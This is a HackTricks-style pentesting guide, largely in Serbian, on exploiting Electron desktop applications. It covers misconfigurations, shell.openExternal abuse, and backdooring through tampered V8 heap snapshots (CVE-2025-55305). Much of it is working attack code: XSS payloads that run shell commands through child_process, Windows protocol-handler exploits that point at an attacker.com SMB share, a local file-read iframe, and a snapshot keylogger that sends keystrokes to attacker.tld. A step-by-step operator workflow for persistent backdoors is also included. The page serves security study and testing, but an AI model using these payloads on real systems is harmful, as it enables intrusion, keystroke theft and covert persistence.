# Electron Desktop Apps

{{#include ../../../banners/hacktricks-training.md}}

## Introduction

Electron kombinuje lokalni backend (sa **NodeJS**) i frontend (**Chromium**), iako mu nedostaju neki sigurnosni mehanizmi modernih pretraživača.

Obično ćete pronaći kod Electron aplikacije unutar `.asar` aplikacije; da biste dobili kod, potrebno ga je ekstrahovati:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
U izvornom kodu Electron aplikacije, unutar `packet.json`, možete pronaći navedenu datoteku `main.js` u kojoj su postavljene sigurnosne konfiguracije.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron ima 2 tipa procesa:

- Main Process (ima potpuni pristup NodeJS-u)
- Renderer Process (trebalo bi da ima ograničen pristup NodeJS-u iz bezbednosnih razloga)

![](<../../../images/image (182).png>)

Jedan **renderer process** biće prozor pregledača koji učitava fajl:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Podešavanja **renderer process** mogu se **konfigurisati** u **main process** unutar fajla main.js. Neka od podešavanja mogu da **spreče Electron aplikaciju da dobije RCE** ili druge ranjivosti ako su **podešavanja ispravno podešena**.

Electron aplikacija **može pristupiti uređaju** preko Node APIs iako se to može konfigurisati da se to spreči:

- **`nodeIntegration`** - po defaultu je `off`. Ako je on, omogućava pristup Node funkcijama iz renderer process.
- **`contextIsolation`** - po defaultu je `on`. Ako je `off`, main i renderer processes nisu izolovani.
- **`preload`** - podrazumevano prazan.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - po defaultu je `off`. Ograničiće akcije koje NodeJS može izvršavati.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`** - po defaultu je `off`.
- Ako je **`nodeIntegration`** **omogućeno**, to bi omogućilo korišćenje **Node.js APIs** na web stranicama koje su **učitane u iframes** unutar Electron aplikacije.
- Ako je **`nodeIntegration`** **onemogućeno**, preloads će se učitavati u iframe.

Example of configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Neki **RCE payloads** sa [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Presretanje saobraćaja

Izmenite konfiguraciju start-main i dodajte korišćenje proxy-ja kao na primer:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron lokalna injekcija koda

Ako možete lokalno izvršiti Electron App, moguće je da ga naterate da izvrši proizvoljni javascript kod. Pogledajte kako u:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Ako je **nodeIntegration** podešen na **on**, JavaScript web stranice može koristiti Node.js mogućnosti jednostavno pozivom `require()`. Na primer, način da se pokrene calc aplikacija na Windowsu je:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Skript naveden u ovoj postavci je **učitavan pre ostalih skripti u rendereru**, tako da ima **neograničen pristup Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Stoga skripta može eksportovati node-features na stranice:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Ako je `contextIsolation` uključen, ovo neće raditi**

## RCE: XSS + contextIsolation

The _**contextIsolation**_ uvodi **odvojene kontekste između skripti web stranice i internog JavaScript koda Electron-a** tako da izvršavanje JavaScripta jednog koda ne utiče na drugi. Ovo je neophodna funkcija za eliminisanje mogućnosti RCE.

Ako konteksti nisu izolovani, napadač može:

1. Izvršiti **proizvoljan JavaScript u renderer-u** (XSS ili navigaciju ka eksternim sajtovima)
2. **Prepisati ugrađenu metodu** koja se koristi u preload-u ili internom Electron kodu kako bi se preuzela kontrola funkcije
3. **Pokrenuti** upotrebu **prepisane funkcije**
4. RCE?

Postoje 2 mesta gde se built-in metode mogu prepisati: u preload kodu ili u internom Electron kodu:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass click event

Ako su primenjena ograničenja pri kliku na link, možda ih možete zaobići **srednjim klikom** umesto regularnog levog klika
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Za više informacija o ovim primerima pogledajte [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) i [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Prilikom postavljanja Electron desktop aplikacije, osiguravanje ispravnih podešavanja za `nodeIntegration` i `contextIsolation` je ključno. Utvrđeno je da **client-side remote code execution (RCE)** koja cilja preload skripte ili Electron-ov native kod iz glavnog procesa efikasno biva sprečena kada su ova podešavanja aktivirana.

Kada korisnik interaguje sa linkovima ili otvori nove prozore, određeni slušači događaja se aktiviraju, koji su ključni za bezbednost i funkcionalnost aplikacije:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Ovi listeneri su **prepisani od strane desktop aplikacije** da bi implementirali sopstvenu **poslovnu logiku**. Aplikacija procenjuje da li navigirani link treba da se otvori interno ili u eksternom web pretraživaču. Odluka se obično donosi preko funkcije, `openInternally`. Ako ta funkcija vrati `false`, to znači da link treba da se otvori eksterno, koristeći funkciju `shell.openExternal`.

**Evo pojednostavljenog pseudokoda:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Electron JS security best practices savetuju da se ne prihvata nepouzdan sadržaj preko funkcije `openExternal`, jer to može dovesti do RCE preko različitih protokola. Operativni sistemi podržavaju različite protokole koji mogu pokrenuti RCE. Za detaljne primere i dalje objašnjenje na ovu temu, pogledajte [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), koji uključuje primere Windows protokola sposobnih da iskoriste ovu ranjivost.

Na macos-u, funkcija `openExternal` može biti iskorišćena za izvršavanje proizvoljnih komandi, na primer `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Primeri exploita Windows protokola uključuju:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Ova vuln se može naći u **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

The **webviewTag** is a **zastarela funkcionalnost** koja omogućava korišćenje **NodeJS** u **renderer process**, i treba da bude onemogućena jer omogućava učitavanje skripte u preload context, kao:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Stoga, napadač koji uspe da učita proizvoljnu stranicu mogao bi iskoristiti taj tag da **učita proizvoljan preload skript**.

Ovaj preload skript je zatim zloupotrebljen da pozove **ranjivu IPC uslugu (`skype-new-window`)** koja je pozivala **`shell.openExternal`** i omogućila RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Čitanje internih fajlova: XSS + contextIsolation

**Onemogućavanje `contextIsolation` omogućava korišćenje `<webview>` tagova**, slično kao `<iframe>`, za čitanje i exfiltrating lokalnih fajlova. Dati primer pokazuje kako iskoristiti ovu ranjivost da se pročita sadržaj internih fajlova:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Dalje, podeljen je još jedan metod za **čitanje internog fajla**, koji ističe kritičnu ranjivost za lokalno čitanje fajlova u Electron desktop app. Ovo uključuje injektovanje skripte radi iskorišćavanja aplikacije i exfiltrate podataka:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + stariji chromium**

Ako je **chromium** koji aplikacija koristi **stariji** i postoje **poznate** **ranjivosti** u njemu, može biti moguće da **iskoristite to i dobijete RCE kroz XSS**.\
Možete videti primer u ovom **writeupu**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing putem internog URL regex bypass**

Pretpostavimo da ste našli XSS, ali **ne možete pokrenuti RCE ili ukrasti interne fajlove** — možete pokušati da ga iskoristite za **ukrasti pristupne podatke putem phishinga**.

Pre svega, treba da znate šta se dešava kada pokušate da otvorite novi URL, proverom JS koda u front-endu:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Poziv **`openInternally`** odlučuje da li će **link** biti **otvoren** u **desktop prozoru** jer je to link koji pripada platformi, **ili** da li će biti otvoren u **pregledaču kao resurs treće strane**.

U slučaju da je **regex** koji funkcija koristi **ranjiv na bypasses** (na primer time što **ne escape-uje tačke poddomena**) attacker bi mogao iskoristiti **XSS** da **otvori novi prozor koji** će biti lociran u infrastrukturi napadača i **tražiti credentials** od korisnika:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protokol

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) pages running on **`file://`** have unilateral access to every file on your machine meaning that **XSS issues can be used to load arbitrary files** from the users machine. Using a **prilagođeni protokol** prevents issues like this as you can limit the protocol to only serving a specific set of files.

## Remote modul

The Electron Remote module allows **renderer processes to access main process APIs**, facilitating communication within an Electron application. However, enabling this module introduces significant security risks. It expands the application's attack surface, making it more susceptible to vulnerabilities such as cross-site scripting (XSS) attacks.

> [!TIP]
> Although the **remote** module exposes some APIs from main to renderer processes, it's not straight forward to get RCE just only abusing the components. However, the components might expose sensitive information.

> [!WARNING]
> Many apps that still use the remote module do it in a way that **require NodeIntegration to be enabled** in the renderer process, which is a **huge security risk**.

Since Electron 14 the `remote` module of Electron might be enabled in several steops cause due to security and performance reasons it's **recommended to not use it**.

To enable it, it'd first needed to **enable it in the main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Zatim, renderer proces može da importuje objekte iz modula na sledeći način:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
The **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** ukazuje na neke zanimljive **funkcije** koje izlaže objekat **`app`** iz remote modula:

- **`app.relaunch([options])`**
- **Ponovo pokreće** aplikaciju tako što **izlazi** iz trenutne instance i **pokreće** novu. Korisno za **ažuriranja aplikacije** ili značajne **promene stanja**.
- **`app.setAppLogsPath([path])`**
- **Definiše** ili **kreira** direktorijum za čuvanje **logova aplikacije**. Logovi se mogu **preuzeti** ili **izmeniti** koristeći **`app.getPath()`** ili **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registruje** trenutni izvršni fajl kao **podrazumevani handler** za specificirani **protokol**. Možete navesti **prilagođenu putanju** i **argumente** po potrebi.
- **`app.setUserTasks(tasks)`**
- **Dodaje** zadatke u **Tasks category** u **Jump List** (na Windows). Svaki zadatak može da kontroliše kako se aplikacija **pokreće** ili koji se **argumenti** prosleđuju.
- **`app.importCertificate(options, callback)`**
- **Uvozi** PKCS#12 sertifikat u sistemski **certificate store** (samo Linux). Može se koristiti **callback** za obradu rezultata.
- **`app.moveToApplicationsFolder([options])`**
- **Premešta** aplikaciju u **Applications folder** (na macOS). Pomaže da se obezbedi **standardna instalacija** za Mac korisnike.
- **`app.setJumpList(categories)`**
- **Postavlja** ili **uklanja** prilagođeni **Jump List** na **Windows**. Možete navesti **kategorije** da organizujete kako se zadaci prikazuju korisniku.
- **`app.setLoginItemSettings(settings)`**
- **Konfiguriše** koji **izvršni fajlovi** se pokreću pri **prijavi**, zajedno sa njihovim **opcijama** (samo macOS i Windows).

Primer:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences modul

Glavni **API** za pristup sistemskim podešavanjima i **emitovanje sistemskih događaja** u Electronu. Metode kao što su **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, i **setUserDefault** su sve **deo** ovog modula.

**Primer upotrebe:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Sluša** nativne macOS notifikacije koristeći NSDistributedNotificationCenter.
* Pre **macOS Catalina**, moglo se presretati **sve** distribuirane notifikacije prosleđivanjem **nil** u CFNotificationCenterAddObserver.
* Posle **Catalina / Big Sur**, sandboxovane aplikacije i dalje mogu da se **pretplate** na **mnoge događaje** (na primer, **zaključavanje/otključavanje ekrana**, **mountovanje volumena**, **mrežna aktivnost**, itd.) registrovanjem notifikacija **po imenu**.

### **getUserDefault / setUserDefault**

* **Interfejsira** sa **NSUserDefaults**, koji čuva **aplikacione** ili **globalne** preferencije na macOS-u.

* **getUserDefault** može da **dohvati** osetljive informacije, poput **lokacija nedavno otvorenih fajlova** ili **geografske lokacije korisnika**.

* **setUserDefault** može da **izmeni** ove preferencije, potencijalno utičući na **konfiguraciju** aplikacije.

* U **starijim verzijama Electron-a** (pre v8.3.0), bio je dostupan samo **standardni skup** NSUserDefaults.

## Shell.showItemInFolder

Ova funkcija prikazuje dati fajl u file manageru, što bi moglo **automatski izvršiti fajl**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Electron aplikacije treba da imaju **Content Security Policy (CSP)** kako bi se **sprečili XSS napadi**. **CSP** je bezbednosni standard koji pomaže da se **onemogući izvršavanje nepouzdanog koda** u browser-u.

Obično se **konfiguriše** u fajlu **`main.js`** ili u **`index.html`** šablonu sa CSP-om unutar **meta taga**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) je alat za identifikovanje pogrešnih konfiguracija i sigurnosnih anti-patterna u Electron aplikacijama.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) je open-source VS Code plugin za Electron aplikacije koji koristi Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) za proveru ranjivih biblioteka treće strane
- [**Electro.ng**](https://electro.ng/): Potrebno je kupiti

## Labs

U [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) možete naći lab vežbu za eksploatisanje ranjivih Electron aplikacija.

Neke komande koje će vam pomoći u labu:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron and Chromium-based apps deserijalizuju unapred izgrađen V8 heap snapshot pri pokretanju (v8_context_snapshot.bin, i opciono browser_v8_context_snapshot.bin) da bi inicijalizovale svaki V8 isolate (main, preload, renderer). Istorijski, Electron’s integrity fuses nisu tretirale ove snapshot-e kao izvršni sadržaj, pa su izbegavali i fuse-based integrity enforcement i OS code-signing checks. Kao rezultat, zamena snapshot-a u instalaciji koja je upisiva od strane korisnika omogućavala je prikriveno, trajno izvršavanje koda unutar aplikacije bez izmene potpisanih binarnih fajlova ili ASAR.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation i OnlyLoadAppFromAsar validiraju JavaScript aplikacije unutar ASAR-a, ali nisu pokrivali V8 heap snapshots (CVE-2025-55305). Chromium isto tako ne vrši integrity-check snapshot-a.
- Attack preconditions: Lokalni upis fajla u direktorijum instalacije aplikacije. Ovo je uobičajeno na sistemima gde su Electron apps ili Chromium browsers instalirani u putanjama koje korisnik može pisati (npr. %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: Pouzdano izvršavanje attacker JavaScript-a u bilo kom isolate-u prebrisavanjem često korišćenog builtin-a (a “gadget”), omogućavajući persistenciju i izbegavanje code-signing verifikacije.
- Affected surface: Electron apps (čak i sa omogućenim fuses) i Chromium-based browsers koji učitavaju snapshot-e iz lokacija koje korisnik može pisati.

Generating a malicious snapshot without building Chromium
- Koristite prebuilt electron/mksnapshot da kompajlirate payload JS u snapshot i prepišete v8_context_snapshot.bin aplikacije.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Rukovođenje izvršavanjem prema isolate-u (pokreni različit kod u main i renderer)
- Detekcija main procesa: Node-only globals kao što su process.pid, process.binding(), ili process.dlopen prisutni su u izolatu glavnog procesa.
- Detekcija browser/renderer: Browser-only globals kao što je alert dostupni su kada se izvršavaš u kontekstu dokumenta.

Primer gadgeta koji jednom ispituje Node mogućnosti glavnog procesa
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
PoC za krađu podataka iz Renderer/browser-context (npr. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Tok rada operatera
1) Napišite payload.js koji clobbers uobičajeni builtin (npr. Array.isArray) i po potrebi grana po isolate.
2) Sastavite snapshot bez Chromium izvora:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Prepišite snapshot fajl(ove) ciljne aplikacije:
- v8_context_snapshot.bin (uvek se koristi)
- browser_v8_context_snapshot.bin (ako se koristi fuse LoadBrowserProcessSpecificV8Snapshot)
4) Pokrenite aplikaciju; gadget se izvršava svaki put kad se koristi izabrani builtin.

Napomene i razmatranja
- Integrity/signature bypass: Snapshot fajlovi se ne tretiraju kao native izvršni fajlovi od strane provera potpisivanja koda i (istorijski) nisu bili pokriveni Electron’s fuses ili Chromium integritetskim kontrolama.
- Persistence: Zamena snapshot-a u instalaciji kojom korisnik može pisati obično preživi restart aplikacije i izgleda kao potpisana, legitimna aplikacija.
- Chromium browsers: Isti koncept manipulacije važi i za Chrome/derivate instalirane na lokacijama u kojima korisnik ima pravo pisanja. Chrome ima druge mitigacije integriteta, ali eksplicitno isključuje fizički lokalne napade iz svog threat model-a.

Detekcija i mitigacije
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Prefer admin-writable-only install locations; baseline and monitor hashes for v8_context_snapshot.bin and browser_v8_context_snapshot.bin.
- Detect early-runtime builtin clobbering and unexpected snapshot changes; alert when deserialized snapshots do not match expected values.

## **References**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
